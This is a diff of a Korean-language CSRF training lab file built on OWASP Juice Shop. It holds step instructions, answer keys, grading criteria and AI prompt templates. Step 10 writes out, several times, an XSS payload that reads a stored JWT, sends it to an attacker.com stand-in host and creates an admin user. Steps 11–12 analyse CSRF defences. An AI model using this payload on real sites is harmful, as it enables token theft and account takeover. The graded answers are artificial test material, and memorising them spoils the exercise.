@@ -932,134 +932,360 @@ steps:
     출력 quote + ACAO `*` 발견 시 ACAC 부재 의미 + 4 케이스 (명시/wildcard/wildcard+cred/
     reflect) 비교 + 권고.
 - order: 10
-  instruction: 'CSRF와 XSS 체인 공격을 설계하시오.
+  instruction: |
+    [목표] XSS + CSRF 체인 공격을 설계한다. XSS 가 있으면 Same-Origin Policy 안에서 실행
+    되므로 CSRF 토큰 / SameSite / Origin 검증 *모든 방어가 무력화* 됨을 학습한다.
 
+    [공격 흐름]
+      1. **XSS 진입점** : W03 에서 발견한 reflected/stored XSS 로 피해자 브라우저에 JS 주입
+      2. **토큰 조회** : `document.querySelector('input[name="csrf_token"]').value` 또는
+         `document.cookie` (HttpOnly 아니면) 또는 localStorage (JWT) 읽기
+      3. **악성 요청 전송** : 탈취한 토큰을 헤더에 포함한 fetch() — Same-Origin 이므로
+         credentials 자동 첨부 + 모든 방어 통과
+      4. **결과 회수** : 응답을 attacker 서버로 exfiltrate (fetch + Image beacon)
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_advanced` 에 적합한 도구: Burp 매크로 또는 curl + jq.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: XSS로 CSRF 토큰을 탈취하는 시나리오를 구성하세요.
+    [PoC (Juice Shop 의 JWT-localStorage 시나리오)]
+      cat > /tmp/xss_csrf_chain.js <<'JS'
+      // Stored XSS payload (W03-S13 의 review storage 활용)
+      const jwt = localStorage.getItem('token');                // 1) 토큰 탈취
+      fetch('http://attacker.com/log?t=' + jwt);                // 2) 외부 전송
+      fetch('/api/Users', {                                     // 3) 악성 요청
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': 'Bearer ' + jwt
+        },
+        body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
+      });
+      JS
+      cat /tmp/xss_csrf_chain.js
+      echo '체인 공격 설계 완료'
+
+    [방어 한계의 본질]
+      - CSRF 토큰: XSS 가 같은 origin → DOM 에서 토큰 읽기 가능 → 무력화
+      - SameSite Strict: 같은 origin 요청은 SameSite 와 무관 → 무력화
+      - Origin 검증: 같은 origin 이라 Origin 헤더 정상 → 통과
+      - 결론: XSS 가 존재하면 CSRF 방어 의 거의 모든 것이 무력화 → **XSS 차단이 곧 CSRF 방어
+        의 전제** — CSP, HttpOnly cookie 가 보조적 layer
+
+    [도구 권장] BeEF / XSSHunter / 직접 PoC 작성. 호출 후 stdout 1~3줄 quote.
+  hint: |
+    XSS 가 있으면 CSRF 토큰/SameSite/Origin 검증 모두 무력화. Same-Origin Policy 안에서
+    실행되기 때문. 따라서 XSS 차단 = CSRF 방어의 전제. CSP + HttpOnly cookie 가 보조 layer.
   category: csrf_advanced
   points: 10
-  answer: '🤖 프롬프트: CSRF와 XSS 체인 공격을 구현 방법을 설명하고 예시 코드를 보여줘
+  answer: |
+    🤖 프롬프트: XSS + CSRF 체인 공격 시나리오 (Juice Shop 의 JWT-localStorage 환경) 를
+    /tmp/xss_csrf_chain.js 로 작성하고, 왜 XSS 가 CSRF 방어를 모두 무력화하는지 분석해줘.
 
-    📎 참고 (CLI): echo ''=== XSS+CSRF 체인 ==='' && echo ''1. XSS로 CSRF 토큰 읽기'' && echo
-    ''2. 탈취 토큰으로 CSRF 요청'' && echo ''3. 방어 우회 성공'' && echo ''체인 공격 설계 완료'''
-  answer_detail: XSS가 존재하면 CSRF 토큰 방어가 무효화됩니다.
+    📎 참고 (CLI):
+      cat > /tmp/xss_csrf_chain.js <<'JS'
+      const jwt = localStorage.getItem('token');
+      fetch('http://attacker.com/log?t=' + jwt);
+      fetch('/api/Users', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': 'Bearer ' + jwt
+        },
+        body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
+      });
+      JS
+      cat /tmp/xss_csrf_chain.js
+      echo '체인 공격 설계 완료'
+  answer_detail: |
+    XSS 는 같은 origin 에서 JS 실행 → DOM 의 모든 것 (토큰, cookie, localStorage) 접근 가능
+    + 그 origin 의 cookie 자동 첨부 + 그 origin 의 Origin 헤더 송신. CSRF 방어 체계는 *외부
+    origin 의 공격* 을 가정하므로 같은 origin XSS 앞에서는 모두 무력. 결론: XSS 가 존재하면
+    CSRF 방어는 의미 없음 → XSS 차단이 우선 (CSP, output encoding, HttpOnly cookie).
   verify:
     type: output_contains
     expect: 체인 공격 설계 완료
     field: stdout
     semantic:
-      intent: CSRF + XSS 체인 — XSS 로 CSRF 토큰 조회 후 악성 요청 전송 (Same-Origin 정책 하에서 가능)
+      intent: |
+        XSS + CSRF 체인 PoC (Juice Shop JWT-localStorage) + Same-Origin 안에서 모든 CSRF
+        방어 (토큰/SameSite/Origin) 무력화 분석.
       success_criteria:
-      - XSS 로 토큰 DOM 조회 JS 예시 (document.querySelector)
-      - 토큰을 포함한 fetch/XHR 로 상태 변경 요청
-      - XSS 가 있으면 CSRF 방어가 무력화됨 설명
+      - /tmp/xss_csrf_chain.js 작성 + cat 출력 quote
+      - localStorage.getItem('token') 또는 document.querySelector 로 토큰 조회
+      - 탈취 토큰 포함한 fetch (Authorization 헤더) 로 악성 요청
+      - XSS = Same-Origin 이라 모든 방어 무력화 사실 명시
+      - 따라서 XSS 차단이 CSRF 방어의 전제 (CSP, output encoding 강조)
       acceptable_methods:
-      - document.querySelector to read token
-      - fetch with token in headers
+      - document.querySelector / localStorage.getItem
+      - fetch with Authorization header
       - BeEF 모듈 exploit chain
       - XSSHunter + custom payload
       negative_signs:
       - XSS 없이 CSRF 만
-      - 토큰 조회 메커니즘 누락
-      - 체인 공격 흐름 설명 없음
+      - Same-Origin Policy 와 CSRF 방어 의 관계 분석 누락
+      - XSS 차단 의 우선성 결론 없음
   target_vm: attacker
-  script: echo '=== XSS+CSRF 체인 ===' && echo '1. XSS로 CSRF 토큰 읽기' && echo '2. 탈취 토큰으로
-    CSRF 요청' && echo '3. 방어 우회 성공' && echo '체인 공격 설계 완료'
+  script: |
+    cat > /tmp/xss_csrf_chain.js <<'JS'
+    const jwt = localStorage.getItem('token');
+    fetch('http://attacker.com/log?t=' + jwt);
+    fetch('/api/Users', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + jwt
+      },
+      body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
+    });
+    JS
+    cat /tmp/xss_csrf_chain.js
+    echo '체인 공격 설계 완료'
   risk_level: low
-  bastion_prompt: 'CSRF와 XSS 체인 공격을 설계하시오.
+  bastion_prompt: |
+    XSS + CSRF 체인 PoC JS 를 /tmp/xss_csrf_chain.js 로 작성. Juice Shop JWT-localStorage
+    환경 가정. 다음 heredoc 실행 후 cat 출력 quote + XSS 가 CSRF 방어 (토큰/SameSite/Origin)
+    를 모두 무력화하는 이유 한 문장.
 
-
-    [도구 권장] csrf_advanced: Burp 매크로 또는 curl + jq. curl 만 쓰지 말고 **Burp 매크로 또는 curl
-    + jq** 등 적합 도구로 호출 후 stdout quote.'
+      cat > /tmp/xss_csrf_chain.js <<'JS'
+      const jwt = localStorage.getItem('token');
+      fetch('http://attacker.com/log?t=' + jwt);
+      fetch('/api/Users', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': 'Bearer ' + jwt
+        },
+        body: JSON.stringify({email:'evil@a.com', password:'p', role:'admin'})
+      });
+      JS
+      cat /tmp/xss_csrf_chain.js
+      echo '체인 공격 설계 완료'
 - order: 11
-  instruction: 'Double Submit Cookie 방어 기법을 분석하시오.
+  instruction: |
+    [목표] Double Submit Cookie 방어의 원리를 Synchronizer Token Pattern 과 비교하고,
+    Stateless / Stateful trade-off 와 known weakness 를 분석한다.
 
+    [원리]
+      1. 서버가 랜덤 토큰을 응답에 *Cookie* 와 *body/header* 두 곳에 동시 송신
+      2. 클라이언트 JS 가 cookie 값을 읽어 `X-CSRF-Token` 헤더에 복사 (또는 form hidden)
+      3. 서버는 cookie 값 == 헤더 값 비교 (정확히 일치해야 통과)
+      4. cross-origin 공격자는 *피해자의 cookie 값을 읽을 수 없음* → 헤더 위조 불가
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 쿠키와 요청 파라미터의 토큰 비교를 설명하세요.
+    [Synchronizer Token (전통적) 과 비교]
+      | 항목              | Synchronizer Token       | Double Submit Cookie    |
+      | ----------------- | ------------------------ | ----------------------- |
+      | 서버 저장          | 세션 store (Stateful)    | 없음 (Stateless)        |
+      | 검증 방식          | 세션 토큰 == 폼 토큰     | cookie == 헤더          |
+      | 확장성             | 세션 store 필요          | 무상태 → 수평 확장 쉬움 |
+      | 알려진 약점        | 세션 fixation 영향        | subdomain cookie 변조   |
+      | 권장 환경          | 단일 monolith             | API gateway, micro-svc  |
+
+    [알려진 약점]
+      - subdomain cookie 변조 : *.victim.com 의 takeover 된 subdomain 이 victim.com 의 cookie
+        설정 (Cookie 의 Domain 속성 활용) → 공격자 토큰을 피해자 브라우저에 주입 가능
+      - HMAC 미적용 시 : 단순 random token 비교는 cookie tossing 공격 노출
+      - 권장: **Signed Double Submit** (HMAC(session_id || token) 검증)
+
+    [실행]
+      cat <<'REPORT'
+      === Double Submit Cookie 방어 ===
+      1. 서버 → Set-Cookie: csrf=<32byte_random>
+      2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
+      3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
+      약점: subdomain cookie 변조 (cookie tossing)
+      대응: Signed Double Submit (HMAC(session_id || token))
+      === Double Submit 분석 완료 ===
+      REPORT
+
+    [도구 권장] OWASP CSRF Prevention Cheat Sheet / Cloudflare __cf_bm 분석 / Django csrf
+    middleware 코드 읽기. 호출 후 stdout 1~3줄 quote.
+  hint: |
+    cookie == header 비교가 핵심. cross-origin 은 cookie 값 못 읽음. Stateless 이점 + subdomain
+    cookie 변조 약점 모두 포함. Signed Double Submit (HMAC) 권장.
   category: csrf_defense
   points: 10
-  answer: '🤖 프롬프트: Double Submit Cookie 방어 기법을 분석해줘
+  answer: |
+    🤖 프롬프트: Double Submit Cookie 방어를 Synchronizer Token 과 비교 표 + 알려진 약점
+    (subdomain cookie 변조) + Signed Double Submit 권장과 함께 분석해줘.
 
-    📎 참고 (CLI): echo ''=== Double Submit Cookie ==='' && echo ''1. 서버가 랜덤 토큰을 쿠키로
-    설정'' && echo ''2. 클라이언트가 헤더에 복사'' && echo ''3. 서버가 일치 확인'' && echo ''Double Submit
-    분석 완료'''
-  answer_detail: 크로스사이트에서는 쿠키 값을 읽을 수 없으므로 헤더에 복사할 수 없습니다.
+    📎 참고 (CLI):
+      cat <<'REPORT'
+      === Double Submit Cookie 방어 ===
+      1. 서버 → Set-Cookie: csrf=<32byte_random>
+      2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
+      3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
+      약점: subdomain cookie 변조 (cookie tossing)
+      대응: Signed Double Submit (HMAC(session_id || token))
+      === Double Submit 분석 완료 ===
+      REPORT
+  answer_detail: |
+    Stateless 라 micro-service 환경에 적합 — 서버가 세션 store 없이 검증 가능. 단 cookie
+    tossing (subdomain takeover 후 victim.com 의 cookie 설정) 으로 공격자 토큰 주입 가능
+    → HMAC(session_id || token) 으로 토큰 무결성 보장하는 Signed Double Submit 권장.
+    OWASP Cheat Sheet 2024 의 기본 권고.
   verify:
     type: output_contains
     expect: Double Submit 분석 완료
     field: stdout
     semantic:
-      intent: Double Submit Cookie — 쿠키 토큰과 헤더/폼 토큰 일치 검증, 서버 세션 저장 불필요한 Stateless
-        방식
+      intent: |
+        Double Submit Cookie 원리 + Synchronizer Token 비교 + subdomain cookie tossing
+        약점 + Signed Double Submit (HMAC) 권장.
       success_criteria:
-      - 쿠키 토큰 + X-CSRF-Token 헤더 동시 전송 구조 설명
-      - HttpOnly 쿠키면 JS 가 읽을 수 없어 공격자 토큰 생성 불가 원리
-      - 한계(subdomain 쿠키 변조 위험) 언급
+      - 3 단계 (서버 Set-Cookie / 클라이언트 헤더 복사 / 서버 비교) 흐름 명시
+      - Synchronizer Token vs Double Submit 비교 (Stateful vs Stateless)
+      - subdomain cookie 변조 (cookie tossing) 약점 언급
+      - Signed Double Submit (HMAC) 권장 + OWASP Cheat Sheet 참조
       acceptable_methods:
-      - OWASP Double Submit Cookie 가이드
+      - OWASP CSRF Prevention Cheat Sheet 2024
       - Django/Rails 구현 예시
       - Cloudflare __cf_bm 유사 구조
-      - Signed Double Submit 변형
+      - Signed Double Submit (HMAC) 변형
       negative_signs:
-      - Synchronizer Token 과 혼동
-      - HttpOnly 역할 설명 없음
-      - Stateless 이점 누락
+      - Synchronizer Token 과 혼동 (구분 누락)
+      - subdomain cookie 변조 위험 누락
+      - HMAC 권장 누락
   target_vm: attacker
-  script: echo '=== Double Submit Cookie ===' && echo '1. 서버가 랜덤 토큰을 쿠키로 설정' && echo
-    '2. 클라이언트가 헤더에 복사' && echo '3. 서버가 일치 확인' && echo 'Double Submit 분석 완료'
+  script: |
+    cat <<'REPORT'
+    === Double Submit Cookie 방어 ===
+    1. 서버 → Set-Cookie: csrf=<32byte_random>
+    2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
+    3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
+    약점: subdomain cookie 변조 (cookie tossing)
+    대응: Signed Double Submit (HMAC(session_id || token))
+    === Double Submit 분석 완료 ===
+    REPORT
   risk_level: low
-  bastion_prompt: 'Double Submit Cookie 방어 기법을 분석해줘
+  bastion_prompt: |
+    Double Submit Cookie 방어 분석:
 
+      cat <<'REPORT'
+      === Double Submit Cookie 방어 ===
+      1. 서버 → Set-Cookie: csrf=<32byte_random>
+      2. 클라이언트 JS → X-CSRF-Token 헤더에 cookie 값 복사
+      3. 서버 → cookie == header 일치 확인 (HMAC 비교 권장)
+      약점: subdomain cookie 변조 (cookie tossing)
+      대응: Signed Double Submit (HMAC(session_id || token))
+      === Double Submit 분석 완료 ===
+      REPORT
 
-    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
-    등 적합 도구로 호출 후 stdout quote.'
+    출력 quote + Synchronizer Token 과의 비교 (Stateful vs Stateless) + Signed Double
+    Submit 권장 이유.
 - order: 12
-  instruction: '프레임워크별 CSRF 방어 기능을 비교하시오.
+  instruction: |
+    [목표] 주요 백엔드 프레임워크의 CSRF 방어 기능을 비교 표로 정리하고, 기본값 / 활성화
+    방법 / 비활성화 위험을 분석한다.
 
+    [프레임워크 매트릭스]
+      | 프레임워크          | 기본 활성화 | 메커니즘                  | 비활성화 코드                    |
+      | ------------------ | ----------- | ------------------------- | ------------------------------- |
+      | Django             | ON          | CsrfViewMiddleware        | @csrf_exempt 데코레이터          |
+      | Rails              | ON          | protect_from_forgery      | skip_before_action :verify_     |
+      | Spring Security    | ON (since 4)| CsrfFilter (Cookie token) | http.csrf().disable()           |
+      | Express (csurf)    | OFF (별도)  | csurf middleware (deprec) | 설치 안 함 (default)             |
+      | Laravel            | ON          | VerifyCsrfToken Middleware| $except 배열 추가                |
+      | NestJS             | OFF (별도)  | @nestjs/csrf (별도)        | 설치 안 함 (default)             |
+      | FastAPI            | OFF (별도)  | fastapi-csrf-protect      | 설치 안 함 (default)             |
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_defense` 에 적합한 도구: SameSite/CSRF 토큰 검증.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: Django, Spring, Express 등의 CSRF 방어를 정리하세요.
+    [관찰 핵심]
+      - SSR + form 기반 (Django/Rails/Laravel) = 기본 ON, 자동 토큰 삽입
+      - API-only / SPA backend (Express/NestJS/FastAPI) = 기본 OFF — JWT-Header 가정
+      - Spring Security 는 양쪽 다 — disable() 가 자주 보이는 위험 코드 패턴
+      - Juice Shop = Express + JWT-Header → csurf 미사용 (의도된 modern stack)
+
+    [실행]
+      cat <<'REPORT'
+      === 프레임워크 CSRF 방어 비교 ===
+      Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
+      Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
+      Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
+      Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
+      Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
+      NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
+      관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
+      === 프레임워크 비교 완료 ===
+      REPORT
+
+    [도구 권장] semgrep 룰 (csrf-disabled 패턴) / SAST / 각 프레임워크 docs. 호출 후 stdout
+    1~3줄 quote.
+  hint: |
+    최소 5개 프레임워크 + 기본 ON/OFF 표시 + disable 코드 패턴 명시. Juice Shop = Express
+    + JWT-Header 라 csurf 안 쓴다는 사실 매핑.
   category: csrf_defense
   points: 10
-  answer: '🤖 프롬프트: 프레임워크별 CSRF 방어 기능을 비교해줘
+  answer: |
+    🤖 프롬프트: Django/Rails/Spring/Express/Laravel/NestJS/FastAPI 의 CSRF 방어 비교 매트릭스
+    + 기본 활성화 여부 + disable 코드 패턴 + Juice Shop 의 Express+JWT 매핑을 출력해줘.
 
-    📎 참고 (CLI): echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo
-    ''Spring: CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
-  answer_detail: 대부분의 현대 프레임워크는 CSRF 방어를 내장하고 있습니다.
+    📎 참고 (CLI):
+      cat <<'REPORT'
+      === 프레임워크 CSRF 방어 비교 ===
+      Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
+      Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
+      Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
+      Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
+      Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
+      NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
+      관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
+      === 프레임워크 비교 완료 ===
+      REPORT
+  answer_detail: |
+    SSR + form 기반 프레임워크 (Django/Rails/Laravel) 는 CSRF 가 디폴트 ON. 반면 API-only
+    프레임워크 (Express/NestJS/FastAPI) 는 디폴트 OFF — JWT-Header 사용 가정. Spring
+    Security 의 `http.csrf().disable()` 호출은 SAST 룰 (semgrep: spring-csrf-disabled) 로
+    탐지 권고. Juice Shop = Express + JWT-Header 라 csurf 미사용이 정상 — modern stack
+    의 디폴트 패턴.
   verify:
     type: output_contains
     expect: 프레임워크 비교 완료
     field: stdout
     semantic:
-      intent: 프레임워크별 CSRF 방어 — Django csrf_token, Rails authenticity_token, Spring
-        CsrfFilter, Express csurf 비교
+      intent: |
+        7개 프레임워크 (Django/Rails/Spring/Express/Laravel/NestJS/FastAPI) CSRF 방어 매트릭스
+        + ON/OFF 디폴트 + disable 위험 코드 패턴 + Juice Shop = Express+JWT 매핑.
       success_criteria:
-      - 3개 이상 프레임워크의 CSRF 방어 기능 이름과 활성화 방법
-      - 자동 vs 수동 토큰 삽입 차이
-      - 취약 설정(disable_csrf) 언급
+      - 5개 이상 프레임워크의 CSRF 방어 매트릭스
+      - 각 프레임워크 의 기본 활성화 여부 + 비활성화 코드 패턴 명시
+      - SSR/form = ON, API+JWT = OFF 의 패턴 관찰
+      - Spring 의 csrf().disable() 위험 + SAST 룰 추천
+      - Juice Shop = Express + JWT-Header → csurf 미사용 정상 매핑
       acceptable_methods:
-      - 표 형식 프레임워크 비교
+      - 매트릭스 형식 프레임워크 비교
       - 각 docs 링크 참조
-      - SAST 로 disable 코드 탐지
+      - SAST (semgrep) 로 disable 코드 탐지
       - 코드 레벨 예시
       negative_signs:
-      - 단일 프레임워크만
+      - 3개 프레임워크 미만
       - 활성화/비활성화 구분 없음
-      - 기본값 안전 여부 불명
+      - Juice Shop 매핑 없음
   target_vm: attacker
-  script: 'echo ''=== 프레임워크 CSRF 방어 ==='' && echo ''Django: csrf_token'' && echo ''Spring:
-    CsrfFilter'' && echo ''Express: csurf'' && echo ''프레임워크 비교 완료'''
+  script: |
+    cat <<'REPORT'
+    === 프레임워크 CSRF 방어 비교 ===
+    Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
+    Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
+    Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
+    Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
+    Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
+    NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
+    관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
+    === 프레임워크 비교 완료 ===
+    REPORT
   risk_level: low
-  bastion_prompt: '프레임워크별 CSRF 방어 기능을 비교해줘
+  bastion_prompt: |
+    프레임워크 CSRF 방어 매트릭스 출력:
 
+      cat <<'REPORT'
+      === 프레임워크 CSRF 방어 비교 ===
+      Django           : CsrfViewMiddleware (ON default)         | @csrf_exempt 위험
+      Rails            : protect_from_forgery (ON default)       | skip_before_action 위험
+      Spring Security  : CsrfFilter Cookie token (ON since 4)    | http.csrf().disable() 위험
+      Express (csurf)  : 별도 미들웨어 (OFF default, deprecated) | 미설치 = 평문 CSRF 노출
+      Laravel          : VerifyCsrfToken (ON default)            | $except 누락 검증
+      NestJS / FastAPI : 별도 패키지 (OFF default)               | JWT-Header 가정
+      관찰: SSR/form = ON / API+JWT = OFF / Spring disable() 패턴 주의
+      === 프레임워크 비교 완료 ===
+      REPORT
 
-    [도구 권장] csrf_defense: SameSite/CSRF 토큰 검증. curl 만 쓰지 말고 **SameSite/CSRF 토큰 검증**
-    등 적합 도구로 호출 후 stdout quote.'
+    출력 quote + Juice Shop = Express + JWT-Header → csurf 미사용 매핑 한 줄.
 - order: 13
   instruction: 'CSRF 취약점 자동 탐지 방법을 구현하시오.
 
